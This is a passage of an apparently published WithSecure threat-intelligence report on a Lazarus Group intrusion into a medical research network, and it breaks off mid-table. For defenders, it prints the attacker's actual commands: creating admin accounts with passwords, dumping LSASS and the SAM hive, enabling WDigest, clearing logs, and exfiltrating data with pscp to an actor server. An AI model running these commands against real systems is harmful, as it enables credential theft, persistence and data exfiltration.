{
    "id": "35cfbc41-cbba-4c1c-8b7e-4a8493c29a71",
    "created_at": "2023-02-04T02:08:17.189606Z",
    "updated_at": "2025-03-27T02:17:23.580842Z",
    "deleted_at": null,
    "sha1_hash": "1dee7a6195d27712adf1cf29121fcfcdbb070942",
    "title": "",
    "authors": "",
    "file_creation_date": "2023-01-31T11:52:13Z",
    "file_modification_date": "2023-01-31T11:52:18Z",
    "file_size": 3350834,
    "plain_text": "# No Pineapple! –DPRK Targeting of Medical Research and Technology Sector\n\n###### WithSecure Threat Intelligence\n\n\n-----\n\n### Contents\n\n1. Executive Summary................................................ 4\n2. Background............................................................ 5\n3. Timeline of events................................................... 6\n4. Tactics, Techniques and Procedures...................... 7\nReconnaissance................................................ 7\nResource Development...................................... 7\nExecution........................................................... 7\nInitial Access...................................................... 7\nPersistence........................................................ 7\nPasswords.......................................................... 8\nPrivilege Escalation............................................ 8\nAccount Creation/Modification........................... 8\nCredential Access.............................................. 9\nDiscovery..........................................................10\nLateral Movement..............................................11\nDefense Evasion...............................................11\nCommand and Control......................................12\nCollection..........................................................13\nExfiltration.........................................................14\nOther Observations...........................................14\n5. Threat Actor Tooling.............................................. 22\nGrease.............................................................. 22\nSPutty link, 3Proxy & Stunnel........................... 23\nDtrack............................................................... 24\nBind Shell......................................................... 26\nAcres.exe......................................................... 26\nMimikatz........................................................... 27\nWeb Shells....................................................... 27\n6. Attribution............................................................. 28\nOverlaps in threat actor TTPs\nand malware..................................................... 28\n\n\n-----\n\nTime zone analysis........................................... 28\nOperational security fail.................................... 29\nInfrastructure Overlap....................................... 29\nThreat Actor Context........................................ 30\n7. Victimology............................................................31\n8. IOCs and Detection.............................................. 32\nMimikatz........................................................... 32\nBind shell.......................................................... 32\nGREASE2........................................................ 32\nCobalt Strike..................................................... 32\n3Proxy.............................................................. 32\nWebshells......................................................... 32\nUser Agent....................................................... 32\nDtrack............................................................... 32\nSSH Public Key................................................ 32\nAll files.............................................................. 32\nIPs.................................................................... 32\nAssociated Infrastructure................................. 32\nYara rules.......................................................... 33\n\n\n-----\n\n### 1. Executive Summary\n\n\nDuring Q4 2022, WithSecure™ responded to a\ncyber-attack conducted by a threat actor that\nWithSecure™ have attributed with high confidence\nto an intrusion set referred to as Lazarus Group.\nAmongst technical indications, the incident observed\nby WithSecure™ also contained characteristics of\nrecent campaigns attributed to Lazarus Group by other\nresearchers.\n\nThe campaign targeted public and private sector\nresearch organizations, the medical research and\nenergy sector as well as their supply chain. The motivation of the campaign is assessed to be most likely\nfor intelligence benefit. Previous reporting on similar\ncampaigns highlights the targeting of technology with\nmilitary implementations and WithSecure™ assesses\nthat this type of targeting continued through Q4 2022.\n\nWithSecure™ Threat Intelligence has named this\nreport ‘No Pineapple’ due to an error message in a\nbackdoor which will append < No Pineapple! > in the\nevent data exceeds segmented byte size.\n\n\n##### Key Incident Points\n\n- Initial compromise and privilege escalation was\nthrough exploitation of known vulnerabilities in\nunpatched Zimbra devices\n\n- Threat actor used off the shelf webshells and\ncustom binaries, as well as abusing legitimate\nWindows and Unix tools (Living Off the Land)\n\n- Threat actor installed tools for proxying, tunnelling\nand relaying connections\n\n- C2 behavior suggests a small number of C2\nservers connecting via multiple relays/endpoints.\nSome C2 servers appear to themselves be\ncompromised victims\n\n- Threat actor exfiltrated ~100GB of data but took no\ndestructive action by the point of disruption\n\n- Other observed possible victim verticals and\nexfiltration by the threat actor imply the motive is\nintelligence collection\n\n- Strong confidence that threat actor is North Korean\nstate sponsored intrusion set LAZARUS Group\n\n\n-----\n\n### 2. Background\n\nA proactive threat hunt by WithSecure™ Intelligence\nidentified beaconing from a WithSecure™ Elements\nEPP (Endpoint Protection Platform) customer to a\nCobalt Strike C2 server. The C2 server IP was listed as\n[an IOC in a blog post written by [REDACTED] on the](https://redacted.com/blog/bianlian-ransomware-gang-gives-it-a-go/)\n[BianLian ransomware group. Other heuristic indicators](https://redacted.com/blog/bianlian-ransomware-gang-gives-it-a-go/)\nof potential malicious activity that were also documented in the [REDACTED] blog provided WithSecure™ Intelligence a low confidence assessment of a\nBianLian infection.\n\nOnce the customer was notified of the compromise,\nWithSecure™ Incident Response was engaged and\nbegan their investigation into a potential ransomware\nincident. As more and more threat actor tooling and\ntechniques were collected from the environment, it\nbecame evident that this was a compromise conducted by a North Korean state-sponsored threat actor.\n\nThe WithSecure™ Threat Intelligence team was\nengaged to study the threat actor’s intent and determine the potential scale and impact of the intrusion.\nThe attribution to Lazarus group was assessed by\nthe Threat Intelligence team with a high degree of\nconfidence based on studied malware, TTPs, and\nadditional findings such as an interesting operational\nsecurity mistake by the threat actor. Previous Lazarus\n[campaigns have been described in blogs from Syman-](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/stonefly-north-korea-espionage)\n[tec and Talos Intelligence earlier in 2022. The activity](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/stonefly-north-korea-espionage)\nWithSecure™ have observed is part of a campaign\nwith similar characteristics to those described in these\nblog posts. The infrastructure observed has been\nestablished since at least May 2022, while most of the\nobserved breaches likely took place during Q3 2022.\nDuring the incident, WithSecure™ uncovered details\nthat established a stronger link between the North\nKorean threat actor, the activity in this campaign,\nand the historic campaigns described by Talos and\nSymantec. The victimology follows the established\npattern of high-value targets in medical research and\nenergy, additionally WithSecure™ believe the threat\nactor has intentionally targeted the supply chain of\nthese verticals.\n\n\nThe threat actor gained access to the network by\nexploiting a vulnerable Zimbra mail server at the end of\nAugust. From multiple proxy addresses they installed\ncommodity webshells and tunnelling/relay software,\nthen exploited a local privilege escalation vulnerability\nin the Zimbra server. Around one week later the threat\nactor exfiltrated multiple gigabytes of data from the\nmail server, most likely the contents of mailboxes.\nOne month later, at the beginning of October 2022\nthe threat actor moved laterally to a vulnerable\ndomain joined Windows XP device. Over the following\nmonth the actor performed further lateral movement,\nreconnaissance, and deployed multiple custom tools\n[and malware such as Dtrack and what WithSecure™](https://malpedia.caad.fkie.fraunhofer.de/details/win.dtrack)\n[believes to be a fresh version of GREASE.](https://malpedia.caad.fkie.fraunhofer.de/details/win.grease)\n\nThe threat actor also relied on multiple open-source\noff-the-shelf tooling and malware.\n\nAt the beginning of November, Cobalt Strike C2\nbeacons were detected from an internal server to two\nthreat actor IP addresses. More connections to actor\ninfrastructure were seen from other compromised\ninternal servers, and then on subsequent days nearly\none hundred gigabytes of data were exfiltrated from\nthe network.\n\nThis threat intelligence report will describe the threat\nactor’s actions and tooling more deeply, as well as\nthe reasoning and links to Lazarus that led to the\nattribution.\n\n\n-----\n\n### 3. Timeline of events\n\n##### Date Event\n\n**2022.08.22** The compromise of the network began with the exploitation of the Zimbra mail server. The\n[threat actor utilized CVE-2022-27925 and CVE-2022-37042 in the Zimbra software to drop](https://www.volexity.com/blog/2022/08/10/mass-exploitation-of-unauthenticated-zimbra-rce-cve-2022-27925/)\nthe webshell “base.jsp”\n\n**2022.08.24** The first interaction with the ‘base.jsp’ webshell was seen, at which point the larger, JSP file\nbrowsing tool “carbon.jsp” was dropped\n\n**2022.08.26** The actor installed the tunneling tools Plink and 3Proxy, and less than 5 minutes later the\nserver made a connection to a second threat actor IP, which was to become the primary\n[actor endpoint from this point on. After this the threat actor exploited CVE-2021-4034 in](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034)\npkexec, known as pwnkit, to perform local privilege escalation to root\n\n**2022.09.01** The threat actor used yum to install Stunnel and used it to connect to 104.225.129[.]103.\nThreat actor modified a script named “databackup.sh”, the function of which is to extract all\nemail messages from the server to a single file named “backup_data.csv”\n\n**2022.09.30** Threat actor made direct SSH connection from the Zimbra server to C2 server\n104.225.129[.]103, accessed backup_data.csv, and exfiltrated ~5GB of data from the\nserver\n\n**2022.10.06** Lateral movement from the Zimbra server to a vulnerable Windows XP client on the\nwindows domain\n\n**2022.10.06-27** Commands executed by the threat actor across several internal hosts from the compromised Windows XP client\n\n**2022.10.27-28** Grease malware used on a server to locate admin accounts, enable the guest account, and\ncreate an account named support, followed by credential harvesting through exporting the\nregistry on the 28th\n\n**2022.10.28** A second server was accessed, and further reconnaissance performed, with a list of domain\nadmins and domain joined computers extracted\n\n**2022.10.31** Credential harvesting using renamed Mimikatz executable and registry extraction. Support\naccount created and made a local admin\n\n**2022.11.04** Cobalt Strike beacons detected to two threat actor IP addresses\n\n**2022.11.05-11** Almost 100GB of data exfiltrated from the network\n\n\n-----\n\n**Document name | Security level**\n\n\n### 4. Tactics, Techniques  and Procedures\n\n\n##### Reconnaissance\n\nWithSecure™ do not have visibility into reconnaissance activity as undertaken by the threat actor. It\nis assumed that a form of external scanning was\nemployed to identify the vulnerable Zimbra service\nthat was subsequently compromised.\n\n##### Resource Development\n\nSeveral binaries deployed by the threat actor were\nsigned with a “LAMERA CORPORATION LIMITED”\ncode signing certificate.\n\n##### Execution\n\nExecution took place with Impacket’s ‘atexec’ module.\nVarious scripting interpreters were also used, such as\nPowerShell and Windows/Unix command shells.\n\n\n##### Initial Access\n\nExploitation of vulnerabilities CVE-2022-27925 and\nCVE-2022-37042 was likely achieved against an internet facing Zimbra server to achieve an initial foothold\non the victim network. These two exploits allowed\nfor remote command execution without any need to\nauthenticate.\n\n##### Persistence\n\nWeb shells and Cobalt Strike beacons were observed\nwhich served as persistence mechanisms. Also, legitimate accounts were compromised, and illegitimate\naccounts were created. The threat actor was also seen\nto create auto-run services and scheduled tasks, both\nof which are common persistence mechanisms with\nthe following commands:\n\n\n**Actions** **Notes**\n\nsc create RegistryCheck type= own type= interact start= auto Create a service which will run acres.exe automatically at startup.\nerror= ignore  binpath= \"cmd /K start c:\\windows\\temp\\acres.exe\"\n\nSuspicious scheduled task creation: \"TaskName\": \"\\\\clNRNthQ\" Several scheduled tasks were created on a server. The task names\nwere all a similar format of 8 random alpha, as seen in the names\nof the temporary files. This may indicate that these scheduled\ntasks were created with Impacket’s ‘atexec’ module\n\nTable 1: Service creation and scheduled task\npersistence commands\n\n\n-----\n\n**Document name | Security level**\n\n\n##### Passwords\n\nThe threat actor set passwords for several accounts\nthey created or enabled with the following commands.\nNote that all passwords have a similar format, most likely\nmade by making a pattern on a US layout keyboard:\n\n**Actions** **Notes**\n\ncmd.exe /C net user support 1234qWeR@#@# /add > C:\\ Add user with specified password\nWindows\\Temp\\[a-zA-Z]{8}.tmp 2>&1\n\nnet user support 1234qWeR@#@# /add Add user with specified password\n\nnet user support 1qaz123@###qA223@# / Add user with specified password\nadd1qaz123@###qA223\n\nnet user support 1qaz@@@#A@ /add Add user with specified password\n\nnet user Guest 1qaz123!@# Add user with specified password\n\nTable 2: Various passwords used by the threat actor\n\n\n##### Privilege Escalation\n\nLegitimate accounts were utilised following password\ndiscovery, and the threat actor created unauthorised\nprivileged accounts. This is detailed below. The threat\n[actor also exploited CVE-2021-4034 in pkexec, known](https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034)\nas pwnkit, to perform local privilege escalation to root.\n\n\n##### Account Creation/Modification\n\nThe threat actor was observed to modify existing\naccounts and create new accounts to enable lateral\nmovement and access. This activity was performed\nthrough hard coded commands within malware as well\nas via Impacket atexec.\n\n\n**Actions** **Notes**\n\nnet user support /add Create support account\n\ncmd.exe /C net localgroup \"Remote Desktop Users\" support /add Add support user to Remote Desktop Users group on local device\n\n- C:\\Windows\\Temp\\[a-zA-Z]{8}.tmp 2>&1\n\ncmd.exe /C net localgroup \"Domain admins\" support /add > C:\\ Add support group to Domain Admins active directory domain group\nWindows\\Temp\\[a-zA-Z]{8}.tmp 2>&1\n\nnet localgroup Administrators support /add Add support account to Administrators group on local device\n\nnet user guest /active:yes Activate guest account\n\nspoolsv.exe -> net localgroup administrators Guest /add Add guest account to Administrators group on local device\n\nTable 3: Commands used for account creation and modification\n\n\n-----\n\n**Document name | Security level**\n\n##### Credential Access\n\nThe threat actor harvested credentials in a few ways:\n\n- They modified the login.jsp file on the Zimbra folder\nto log to a text file when any user logged in through\nthe web interface. This logged the username, password, and remote IP address of any authentications\nto the Zimbra login page to the file zlog.txt.\n\n- They modified the WDigest registry key on a device\nto configure it to store credentials in memory, which\nmakes hash extraction with Mimikatz possible\n\n- They used MiniDump of comsvcs.dll to dump the\nmemory of the LSASS process to a file, making it\npossible to then retrieve that file and extract the\nhashes with Mimikatz.\n\n**Activity** **Notes**\n\n/opt/zimbra/jetty_base/webapps/zimbra/public/login.jsp File modified to log credentials to text file at /opt/zimbra/jetty_base/\nwebapps/zimbra/public/temp/zlog.txt\n\nregkeyvalue:_HKLM\\SYSTEM\\ControlSet001\\Control\\ Configure device to store credentials in memory, making it possible\nSecurityProviders\\WDigest\\\\UseLogonCredential to extract hashes with Mimikatz\n\n\ncmd.exe /C c:\\windows\\system32\\rundll32.exe C:\\windows\\\nSystem32\\comsvcs.dll, MiniDump 680 C:\\windows\\\ntemp\\mmc.dat full > C:\\Windows\\Temp\\[a-zA-Z]{8}.tmp\n2>&1add1qaz123@###qA223\n\nTable 4: Commands and activity for collecting credentials\n\n\nCreating a minidump of lsass with the help of comsvcs.dll which can\nthen be moved elsewhere for hashes to be extracted using Mimikatz.\n\n\n-----\n\n**Document name | Security level**\n\n##### Discovery\n\nThe threat actor used many built in commands to\nenumerate the network and compromised devices.\nSome of these commands were hardcoded into\nbinaries, but others were run manually by the operators. Many commands used were standard Windows\ncommand line tools, though two PowerShell cmdlets\nwere also run.\n\n**Activity** **Notes**\n\ncmd.exe /C dir /a \\[internal IP]\\d$\\[directories] > C:\\Windows\\ Directory listing of a directory on the D$ drive share on the local\nTemp\\[a-zA-Z]{8}.tmp 2>&1 device, though using the device IP address for some reason.\n\ncmd.exe /C ipconfig /all > C:\\Windows\\Temp\\[a-zA-Z]{8}. Querying the network configuration of the local device.\n\ncmd.exe /C net group /domain Domain Admins\" > C:\\Windows\\ Querying members of the Domain Admins group with the built in\nTemp\\[a-zA-Z]{8}.tmp 2>&1\" Windows net command. As well as net group, the threat actor used\nnet user and net share to gather information.\n\ncmd.exe /C netstat -naop tcp > C:\\Windows\\Temp\\[a-zA-Z]{8}. Listing active established network connections on listened ports\ntmp 2>&1\n\ncmd.exe /C nslookup [hostname.fqdn] > C:\\WINDOWS\\Temp\\ Query default name server for supplied host/domain name\n\n[a-zA-Z]{8}.tmp 2>&1\n\n\ncmd.exe /C powershell Get-ADComputer -Filter * -Properties\nipv4Address, OperatingSystem, OperatingSystemServicePack >\nC:\\Windows\\Temp\\[a-zA-Z]{8}.tmp 2>&1\n\n\nList computer accounts in Active Directory, returning IP address,\nOS, and OS Service Pack level\n\n\ncmd.exe /C powershell.exe Get-Process Lsass > C:\\Windows\\ Return information about the LSASS process\nTemp\\[a-zA-Z]{8}.tmp 2>&1\n\ncmd.exe /C query session > C:\\Windows\\Temp\\[a-zA-Z]{8}.tmp Return information about active sessions on the local device. The\n2>&1 threat actor also used query user, which returns information about\nthe active users in those sessions\n\ncmd.exe /C reg.exe save hklm\\sam c:\\windows\\temp\\sam.save > Save a copy of the SAM registry hive. The threat actor saved the\nC:\\Windows\\Temp\\[a-zA-Z]{8}.tmp 2>&1 Security and System hives in the same way\n\ncmd.exe /C systeminfo > C:\\Windows\\Temp\\[a-zA-Z]{8}.tmp 2>&1 Returns detailed information about the local device hardware and OS\n\n\ncmd.exe /C wevtutil epl Microsoft-Windows-TerminalServicesRemoteConnectionManager/Operational C:\\windows\\temp\\rdl.\nevtx /q:Event[System[EventID=1149]]\" > C:\\Windows\\Temp\\\n\n[a-zA-Z]{8}.tmp 2>&1\"\n\n\nExport events from the RDP event log, specifically event ID 1149,\nwhich will show which users have connected to the local device via\nRDP\n\n\ncmd.exe /C ping -n 1 [Internal IP]> C:\\Windows\\Temp\\[a-zA-Z]{8}. Send a single ICMP ping to another device on the network\ntmp 2>&1\n\ncmd.exe /C tasklist > C:\\Windows\\Temp\\[a-zA-Z]{8}.tmp 2>&1 View currently running processes with ‘tasklist’ command\n\ncmd.exe /C cd d:\\ & tree d: > C:\\Windows\\Temp\\[a-zA-Z]{8}.tmp Display the folder structure of the d: drive and pipe output to the\n2>&1 temp folder\n\nTable 5: Discovery commands executed with Impacket\n\n\n-----\n\n##### Lateral Movement\n\nThe threat actor used harvested credentials where\navailable to move laterally within the network over RDP\nand SMB, almost certainly then using that access to\ninstall malicious binaries for persistence on devices of\ninterest/use.\n\n\n**Document name | Security level**\n\n##### Defense Evasion\n\nThe threat actor made attempts to remove artifacts\nand indicators of their presence, deleting files and\ntools and clearing logs. As well as removing traces,\nthey also attempted to give dropped files innocent\nnames which would blend into the system they were\non, most noticeably on the Zimbra server where\nwebshells and archives for exfiltration were given the\nsame name as other directories within the same\nparent directory.\n\n\n**Activity** **Notes**\n\ncmd.exe /C del /f /q /a c:\\windows\\temp\\*.tmp > C:\\Windows\\ Deletion of temp files\nTemp\\[a-zA-Z]{8}.tmp 2>&1\n\ncmd.exe /C net use \\[Internal IP]\\d$ /delete > C:\\Windows\\Temp\\ Removal of network drive\n\n[a-zA-Z]{8}.tmp 2>&1\n\n\"Microsoft-Windows-TerminalServices- Deletion of RDP logs\nRemoteConnectionManager/Admin\" cleared by \"support\" account\n\nSkins.dat, carbon.jsp, base.jsp Each of these files on the Zimbra server was named to match a\npre-existing, legitimate directory within the same parent directory.\n\nTable 6: Defence evasion activity\n\n\n-----\n\n##### Command and Control\n\nCobalt Strike beacons were observed to\n104.225.129[.]103 and 104.225.129[.]86. The .103\nIP address also received SSH connections from the\nnetwork, over which data was exfiltrated.\n\nThe Acres.exe binary connected to what appeared\nto be a compromised host acting as a command and\ncontrol server for the malware (15.207.207[.]64). The\n[server also hosted an open source WSO webshell.](https://github.com/mIcHyAmRaNe/wso-webshell/blob/master/wso.php)\nThe webshell and acres.exe C2 were found in different\nsub-folders of the same open directory, and the C2\nwas observed logging connecting entities to a publicly\naccessible file. From this log another victim was identified, as well as incoming connections from a few TOR\nexit nodes.\n\n\n**Document name | Security level**\n\nThis same C2 also contained another potential\ncommand and control “/resource/images/brow.php”\nfor another malware. We noticed logging of connections to this file as well, and some of the contacting\nIP addresses were shared between the acres.exe C2\nand brow.php.\n\n\n**Filename** **Notes**\n\ncarbon.jsp Initial file browsing tool installed immediately following compromise\n\nbase.jsp Second webshell installed by actors\n\nskin.dat Data dump file created and exfiltrated by the threat actor\n\nBrow.php Command and Control service found on open index on IP address\n15.207.207[.]64, not directly used in this incident\n\nTable 7: Threat actor files on webservers\n\nMultiple other IP addresses were observed connecting\nto the base.jsp and carbon.jsp webshells during the\ncompromise, and many of these connections had the\nsame user agent string, indicating use of Firefox and\nx86_64 Linux:\n\n\nMozilla/5.0 (X11; Linux x86_64; rv:91.0)\nGecko/20100101 Firefox/91.0\n\n\nConnections to the webshells on the victim with this\nuser agent string were observed from many different\nIP addresses within a single Hong Kong located /24\nsubnet, a scattering of other IP addresses, and most\nnotably one North Korean state internet IP address.\nThe following table depicts these items.\n\n\n-----\n\n**Document name | Security level**\n\n**IP Address** **Notes**\n\n209.95.60[.]92, connected to webshell Hong Kong, Softlayer\n\n23.237.32[.]34, connected to webshell US, Cogent, possible VPN endpoint, multiple quickconnect.io/\nSynology.me domains\n\n193.176.211[.]0/24, connected to webshell 33 different IP addresses from across this entire range were used over\nan extended time frame, often changing at short intervals.Possible\nVPN endpoint, multiple quickconnect.io/Synology.me domains\n\n146.185.26[.]150, connected to webshell US, Hosting Services Inc., possible VPN endpoint, multiple\nquickconnect.io/Synology.me domains\n\n154.6.26[.]2, connected to webshell US, Clouvider Limited\n\n175.45.176[.]27, connected to webshell Star Joint Venture Co. Ltd., IP in North Korea\n\nTable 8: Threat actor activity originating from various IP addresses\n\n\nThe threat actor installed tools for proxying, tunnelling\nand relaying connections. C2 behavior suggests a\nsmall number of C2 servers connecting via multiple\nrelays/endpoints. Some C2 servers appear to themselves be compromised victims. The threat actor\nconnected from what appears to be a compromised\nweb server on another victim network, and while they\nconnected from many other external sources, the\nobserved user agent remained consistent. As such, it\nseems likely that as well as using relays to route traffic\nwithin a victim network, they may also be relaying\ntraffic from their operator home range via VPN or VPS\nservices and compromised devices, whether victims\nor opportunistically compromised Internet devices.\nPlink (Putty link) and 3Proxy were used together to\ncreate a proxy internally on the victim environment.\n\n\n##### Collection\n\nWithSecure™ did not observe data staging directly,\nhowever the Dtrack binary had info stealer functionality\nto gather data into a password protected archive,\nand then transfer that archive to another internal host\nwhich was hardcoded into the malware by IP address,\nwhich strongly implies that this activity did take place.\nWe can also assume that data staging occurred as the\nvast majority of data that was exfiltrated was done so\nfrom a single endpoint.\n\n\n-----\n\n##### Exfiltration\n\nThe threat actor made a number of SSH connections\nwhere large volumes of data were moved out of the\nnetwork, and in one case ‘pscp’ (the Putty Secure\nCopy command) was used to transfer a file out of the\nvictim network to the actor infrastructure. While this\nmeant that the connection was encrypted, it also\n\n\n**Document name | Security level**\n\nmeans that the username and password for the exfil\nserver was recovered from the victim device. Some\ndata was also staged on the Zimbra server (possibly\nfrom the mail server itself) and then exfiltrated by the\nthreat actor using a webshell.\n\n\n**Activity** **Notes**\n\n\ncmd.exe /C echo y | c:\\windows\\temp\\pscp.exe -scp -P 22\n-pw [REDACTED] \\[Internal IP]\\d$\\[directory]\\[filename]\n\n[REDACTED]@104.225.129[.]103:/home/[redacted]/ > C:\\\nWindows\\Temp\\[a-zA-Z]{8}.tmp 2>&1\n\n\nUse Putty SCP to make an SSH connection to threat actor server\n104.225.129[.]103, authenticate with the username and password\n\n\nGET /zimbraAdmin/skins/skin.dat <1GB file exfiltrated from the network by the threat actor from\nthe Zimbra mail server. The filename was taken from a legitimate\ndirectory name in the same folder\n\nTable 9: Exfiltration activity\n\n##### Other Observations\n\n###### Operator behaviours\n\n\nMany commands were run by the threat actor on\ndevices on the network. Reviewing these commands\nWithSecure™ found that some matched up to the\nhardcoded commands found in the threat actor binaries, but other commands contain errors which imply\nthey were manually typed by an operator, most likely\nusing the Impacket atexec module. Commands run by\nthe threat actor with hands on keyboard using atexec\ncan be identified as they redirected std-out and std-err\nto a randomly named .tmp file in C:\\Windows\\\n\n\ntemp, and these files were always named 8 random\nalpha characters, i.e., “[a-zA-Z]{8}”.tmp, whereas the\nhardcoded commands did not do this.\n\nThe threat actor used several common locations for\nbinaries and temp files, mostly C:\\Windows\\Temp, but at\none point they used the Documents folder of the support\nuser they created, and in activity associated with the\n‘secver.exe’ binary they created an additional subfolder\nnamed ‘sec’ within the C:\\Windows\\Temp folder.\n\n\n-----\n\n**Document name | Security level**\n\n\n###### LAMERA CORPORATION LIMITED  signed binaries\n\nSeveral binaries deployed by the threat actor were\nsigned with a “LAMERA CORPORATION LIMITED”\ncode signing certificate (See Threat actor Tooling –\nDtrack for certificate details). These are listed in the\nfollowing table:\n\n**Binary**\n\nsecver.exe\n\nmsmptray.exe\n\nprintfs.exe\n\npac.exe\n\nonedriver.exe\n\nTable 10: Binaries signed with Lamera Corporation Limited\ncode signing certificate\n\n###### Consistent User Agent\n\nA specific user agent was consistently observed\nfrom threat actor infrastructure interacting with the\nwebshells, including from the actor’s home range:\n\n\nMozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\n\n\n###### Tooling\n\nA few binaries were dropped and executed by the\nthreat actor. While some files could not be retrieved,\nthe method of execution still gives information\nabout them, for example ‘ras.exe’ appears to be a\ncommand line WinRAR binary, based upon the flags\n\n\nand arguments supplied to it. The below table lists\nartifacts of the threat actor tools, including binary\nnames, command lines, directory locations, and\nindicators of tool use across differing systems.\n\n\n-----\n\n**Document name | Security level**\n\n**Activity** **Notes**\n\nc:\\windows\\temp\\msmptray.exe Threat actor binary - Network connection resembles Cobalt Strike\njQuery malleable C2 profile\n\nc:\\windows\\temp\\printfs.exe Threat actor binary - Network connection resembles Cobalt Strike\njQuery malleable C2 profile\n\n/opt/zimbra/jetty_base/webapps/zimbraAdmin/GCONV_PATH=./ Artifact from exploit of pkexec pwnkit CVE-2021-4034\n\n\ncmd.exe /C c:\\windows\\temp\\ras.exe a c:\\windows\\temp\\zmc.dat\nc:\\windows\\temp\\system.save -pwindows > C:\\Windows\\Temp\\\n\n[a-zA-Z]{8}.tmp 2>&1\n\ncmd.exe /C c:\\windows\\temp\\ras.exe x c:\\windows\\temp\\Plock.\nrar c:\\windows\\temp -pwindows > C:\\Windows\\Temp\\[a-zA-Z]{8}.\ntmp 2>&1\n\n\n‘ras.exe’ seems to be command line WinRAR executable, here with the\n‘-a’ flag to add a file to an archive. Note the differing capitalization within\nthe command, compared to the .tmp file where output is piped\n\n‘ras.exe’ executed with the ‘-x’ flag to extract an archive. ‘-a’ and ‘-x’\nflags are standard flags for WinRAR at the command line\n\n\ncmd.exe /C taskkill /f /im msmptray.exe > C:\\Windows\\Temp\\ ‘taskkill’ used to stop the threat actor’s own running process\n\n[a-zA-Z]{8}.tmp 2>&1\n\ncmd.exe /C c:\\windows\\temp\\printfs.exe > C:\\Windows\\Temp\\ Execute threat actor binary ‘printfs.exe’ and pipe output to the temp\n\n[a-zA-Z]{8}.tmp 2>&1 folder\n\n%lan%\\[Internal IP]\\e\\mfcbi.dll ‘Spoolsv.exe’ accessing file in the drive root share\n\n%lan%\\[Internal IP]\\E\\ord.dll ‘Spoolsv.exe’ accessing file in the drive root share. Differently\ncapitalized compared to previous similar command\n\n%lan%\\[Internal IP]\\source\\mfcbi.dll ‘Spoolsv.exe’ accessing a file in a share, not the drive root.\n\n%systemroot%\\system32\\spool\\drivers\\x64\\3\\new\\mfcbi.dll ‘Spoolsv.exe’ accessing a file in driver store\n\n%systemroot%\\temp\\rdpconf.exe ‘Spoolsv.exe’ accessing file in temp\n\ncmd.exe /C c:\\windows\\temp\\elf.exe NULL FF.FF.FF.FF NULL ‘elf.exe’ being executed. The arguments passed to it imply that the\n\n[Internal IP] > C:\\Windows\\Temp\\[a-zA-Z]{8}.tmp 2>&1 binary may act as a network relay\n\ncmd.exe /C c:\\windows\\temp\\sau.exe 9232 c:\\windows\\temp\\ PID 9232 was ‘explorer.exe’, though the function of ‘sau.exe’ and\nklrbc.exe > C:\\Windows\\Temp\\[a-zA-Z]{8}.tmp 2>&1 ‘klrbc.exe’ is not known\n\ncmd.exe /C c:\\windows\\temp\\sec\\OneDriver.exe > C:\\WINDOWS\\ Execution of ‘OneDriver.exe’ from a subfolder of the temp folder.\nTemp\\[a-zA-Z]{8}.tmp 2>&1\n\nTrojan.TR/Crypt.XPACK.Gen2 - C:\\Windows\\Temp\\aaps.exe File access attempt on file detected by AV, after repeated attempts\nthe threat actor gave up attempting to use this binary\n\n/opt/zimbra/.ssh/known_hosts Known_hosts file on the Zimbra server was modified by the threat\nactor, containing an SSH public key for 104.225.129[.]103\n\nFailed SSH connections Multiple failed SSH connections were observed from the Zimbra server\nto 4 IP addresses, one of which appears likely to be another victim\n\nfDenyTSConnections = 0 Command run by threat actor to enable RDP connections on a device\n\nfDenyTSConnections = 1 Command run by threat actor to disable RDP connections on a\ndifferent device\n\nexecutable created in /usr/bin/atd with SUID bit The only recently modified file in the directory, owned by root, it\nwas modified during the period that the threat actor was active on\nthe device. The file was compiled on an Ubuntu machine, and calls\nsetreuid, setregid to force privileges to root and then executes the\n\"system\" call using the program's arguments. Permissions: -rwsr-xr-x\n\nfile:_C:\\temp\\poo.exe HackTool:Win32/Mikatz!dha\n\nfile:_C:\\Users\\support\\Documents\\prints.exe HackTool:Win32/Mikatz!dha\n\nfile:_C:\\Windows\\Temp\\Plock.exe HackTool:Win32/Mikatz!dha\n\nfile:_C:\\Windows\\Temp\\prinsf.exe HackTool:Win32/Mikatz!dha\n\nTable 11: Malware and tools executed by the threat actor\n\n\n-----\n\n**Document name | Security level**\n\n###### Ports\n\nMany connections were made from the victim to the\nthreat actor infrastructure on a wide array of ports.\nSome of the ports are quite generic, such as 22/SSH,\n80/HTTP and 443/SSL, but others are more obscure.\n\n**TCP Ports connected to on Threat actor infrastructure**\n\n22\n\n80\n\n443\n\n1119\n\n3123\n\n3124\n\n4444\n\n5000\n\n8000\n\n8181\n\n8282\n\n8443\n\n9000\n\nTable 12: TCP Ports connected to on Threat actor infrastructure\n\n###### Indications of Manual Operations\n\nIn the commands that were executed there were\nseveral typos, which imply that the commands\nwere typed by an operator at a keyboard using a\nremote shell, rather than automated/programmatic\ncommands.\n\n**Activity** **Notes**\n\nnet localgroupe administrators support /add Mistyped command (net localgroup)\n\ncmd.exe /C traceroute [FQDN] > C:\\WINDOWS\\Temp\\[a-zA-Z] Linux command attempted on Windows device\n{8}.tmp 2>&1\n\ncmd.exe /C tracert [FQDN] > C:\\WINDOWS\\Temp\\[a-zA-Z]{8}. Correct Windows command inputted immediately after incorrect\ntmp 2>&1 Unix command.\n\nTable 13: Mistyped commands\n\n\n-----\n\n**Document name | Security level**\n\n###### TTP Summary\n\n**Tactic** **Technique** **Description** **Activity**\n\n\n\n\nRESOURCE **T1587.002** Code Signing\nDEVELOPMENT Certificates\n\nINITIAL ACCESS **T1190 Exploit Public**\nFacing Application\n\nEXECUTION **T1059 Command and**\nScripting Interpreter\n\nEXECUTION **T1569.002** System\nServices – Service\nExecution, S0357 Software\n\n            - Impacket\n\n\nSeveral binaries deployed by the threat actor were\nsigned with a “LAMERA CORPORATION LIMITED”\ncode signing certificate\n\n\nCompromise of CVE-2022-27925 and CVE-2022-37042\n\n\nUse of WMI and PowerShell to interact with host,\ninteractive shells also used for manual execution of\ncommands\n\n\n\n\n‘atexec’ module of Impacket to proxy command execution on hosts\n\n\nEXECUTION **T1106 Native API** Use of WinExec API to execute commands \n\nPERSISTENCE **T1505.003 Server**\nSoftware, Component\n\n            - Web 